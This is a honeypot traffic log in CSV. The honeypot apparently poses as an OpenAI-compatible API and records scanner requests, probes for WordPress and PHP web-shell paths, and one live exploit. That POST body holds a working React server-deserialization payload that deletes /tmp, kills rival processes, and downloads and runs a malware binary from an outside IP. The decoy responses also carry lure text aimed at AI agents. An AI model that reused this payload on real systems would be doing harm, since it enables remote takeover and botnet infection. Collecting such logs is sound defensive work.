request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
ca10ab68-fb3d-4aff-9e8b-78d07fb8cb1d,2026-04-21T17:37:45.670540+00:00,anon_de495d21,GET,/,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
481dfd28-3a63-4e65-a9b5-15cb9a489e93,2026-04-21T17:37:46.192276+00:00,anon_de495d21,GET,/favicon.ico,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c4948911-61de-42df-b375-638732b7c2bc,2026-04-21T17:37:49.719078+00:00,anon_de495d21,GET,/sitemap.xml,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c0835401-361c-43ff-875f-7624c0813360,2026-04-21T17:56:04.147602+00:00,anon_e015b404,GET,/,[honeypot-host],"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",1,
5cdc8529-a95c-4c7e-abab-5ef651311b37,2026-04-21T18:16:35.620167+00:00,anon_5a9eae90,POST,/,[honeypot-host],Mozilla/5.0,,1567,316,1,,"------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""0""

""$1""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""1""

{""status"":""resolved_model"",""reason"":0,""_response"":""$5"",""value"":""{\""then\"":\""$4:map\"",\""0\"":{\""then\"":\""$B3\""},\""length\"":1}"",""then"":""$2:then""}
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""2""

""$@3""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""3""

""""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""4""

[]
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""5""

{""_bundlerConfig"":{},""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$4:constructor:constructor""},""_prefix"":""(function(){\n        try {\n            var res = process.mainModule.require(\""child_process\"").execSync(\""cd /tmp; pkill -9 morte; kill xd.x86; pkill -9 locker; killall -9 morte 2\u003e/dev/null; killall -9 locker 2\u003e/dev/null; rm -rf /tmp/* 2\u003e/dev/null; busybox wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /usr/bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /sbin/wget http://94.156.152.67:83/manji.x86 -O manji.x86; chmod 777 manji.x86; ./manji.x86 nextjs\"").toString();\n            console.log(\""\\n[+] RCE RESULT:\\n\"" + res);\n            throw new Error(\""[+] RCE SUCCESS: \"" + res);\n        } catch(e) {\n            console.log(e);\n            throw e;\n        }\n    })()//""}
------WebKitFormBoundaryReactCVE--
","------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""0""

""$1""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""1""

{""status"":""resolved_model"",""reason"":0,""_response"":""$5"",""value"":""{\""then\"":\""$4:map\"",\""0\"":{\""then\"":\""$B3\""},\""length\"":1}"",""then"":""$2:then""}
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""2""

""$@3""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""3""

""""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""4""

[]
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""5""

{""_bundlerConfig"":{},""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$4:constructor:constructor""},""_prefix"":""(function(){\n        try {\n            var res = process.mainModule.require(\""child_process\"").execSync(\""cd /tmp; pkill -9 morte; kill xd.x86; pkill -9 locker; killall -9 morte 2\u003e/dev/null; killall -9 locker 2\u003e/dev/null; rm -rf /tmp/* 2\u003e/dev/null; busybox wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /usr/bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /sbin/wget http://94.156.152.67:83/manji.x86 -O manji.x86; chmod 777 manji.x86; ./manji.x86 nextjs\"").toString();\n            console.log(\""\\n[+] RCE RESULT:\\n\"" + res);\n            throw new Error(\""[+] RCE SUCCESS: \"" + res);\n        } catch(e) {\n            console.log(e);\n            throw e;\n        }\n    })()//""}
------WebKitFormBoundaryReactCVE--
",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e34ef4a8-82d2-46ac-831e-13a9b10241da,2026-04-21T18:20:30.662311+00:00,anon_35650306,GET,/,[honeypot-host],Go-http-client/1.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
97fcecd7-0c94-4870-8d21-71302322aa2e,2026-04-21T18:47:12.294171+00:00,anon_76a7e106,GET,/,[honeypot-host],Go-http-client/1.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",1,
fac307aa-4b66-4ad5-b69d-e4258963e0b5,2026-04-21T19:24:00.571932+00:00,anon_ada6bf7f,GET,/wp-content/plugins/hellopress/wp_filemanager.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
ab7e7d5d-2c96-4394-b6ca-a34d82d62061,2026-04-21T19:24:01.577564+00:00,anon_ada6bf7f,GET,/rip,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
add09bc2-97d5-4635-9f1a-e9ffc92819e3,2026-04-21T19:24:02.059322+00:00,anon_ada6bf7f,GET,/archive.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b63fde34-e59d-435a-baa1-94ff08d60a06,2026-04-21T19:24:02.498289+00:00,anon_ada6bf7f,GET,/term.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a5c8eebe-bb1a-4d34-b522-8209d22d34aa,2026-04-21T19:24:02.981296+00:00,anon_ada6bf7f,GET,/0x.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a1a785a6-199a-49f4-80d2-88e3c259c4fd,2026-04-21T19:24:03.571762+00:00,anon_ada6bf7f,GET,/3.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
68a1c5f5-bc0b-48d6-bb47-1a98c0b69228,2026-04-21T19:24:03.971657+00:00,anon_ada6bf7f,GET,/wp-admin/maint/index.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
7dd0d2b2-0691-49b7-84dd-0668b8ab9c28,2026-04-21T19:24:04.420122+00:00,anon_ada6bf7f,GET,/sql.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
71d1e9e1-b257-4331-9c8d-3dfb11031585,2026-04-21T19:24:04.868098+00:00,anon_ada6bf7f,GET,/style.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b7d7ca40-061d-4201-87bf-4f1abea412ff,2026-04-21T19:24:05.273055+00:00,anon_ada6bf7f,GET,/admin.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
474cd504-99e7-4024-9379-152325f83568,2026-04-21T19:24:05.719878+00:00,anon_ada6bf7f,GET,/inputs.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
50223699-b0d5-4a9a-9004-0590443c68b7,2026-04-21T19:24:06.151516+00:00,anon_ada6bf7f,GET,/file.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
4fe01d55-5ddf-4b5d-ad84-d7cac32791d1,2026-04-21T19:24:06.750984+00:00,anon_ada6bf7f,GET,/ms-edit.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9842b99d-a300-4ad1-909d-5c54d3d7a9bf,2026-04-21T19:24:07.481110+00:00,anon_ada6bf7f,GET,/simple.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
89e72245-b3fb-4a0a-af0d-27814897807c,2026-04-21T19:24:07.795250+00:00,anon_ada6bf7f,GET,/bgymj.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9356f43f-0121-47f8-a295-6c04bb0a6764,2026-04-21T19:24:08.183249+00:00,anon_ada6bf7f,GET,/wp-content/plugins/twenty/login.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f754a76a-eaf6-40c9-9c13-8839c6625941,2026-04-21T19:24:08.855111+00:00,anon_ada6bf7f,GET,/404.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c5d8a6c2-98a2-4f6e-b2c5-e82d7ba5024d,2026-04-21T19:24:09.302029+00:00,anon_ada6bf7f,GET,/file3.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
3063c45b-d28c-4050-90af-f9231e479191,2026-04-21T19:24:09.667850+00:00,anon_ada6bf7f,GET,/wp-mail.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a86fecf9-a2fd-45e5-847b-41b46dc0e988,2026-04-21T19:24:10.351912+00:00,anon_ada6bf7f,GET,/about.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2c0caf01-193f-4d53-9b19-7da8deb2663d,2026-04-21T19:24:10.951437+00:00,anon_ada6bf7f,GET,/wp.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
6fbb9c6e-83b2-44b0-85e3-43a12e81998e,2026-04-21T19:24:11.679998+00:00,anon_ada6bf7f,GET,/.dj/index.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8b650260-298c-43ef-aecb-91fcec887a75,2026-04-21T19:24:11.998392+00:00,anon_ada6bf7f,GET,/adminfuns.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
33a59fb5-8608-4d9d-b0cd-8139f33a0dd1,2026-04-21T19:24:12.408904+00:00,anon_ada6bf7f,GET,/php8.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
301efb20-3f56-4bff-8fb9-f45893e20f8e,2026-04-21T19:24:13.285420+00:00,anon_ada6bf7f,GET,/classwithtostring.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c53c483b-87af-4cec-851b-9ea952022bc1,2026-04-21T19:24:14.854356+00:00,anon_ada6bf7f,GET,/info.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
bb6a47a8-944c-41f6-a236-18d0dd29daab,2026-04-21T19:24:15.622198+00:00,anon_ada6bf7f,GET,/ioxi-o.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e3d2682a-16f5-488f-af01-3a5aa84fb213,2026-04-21T19:24:16.792666+00:00,anon_ada6bf7f,GET,/011i.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
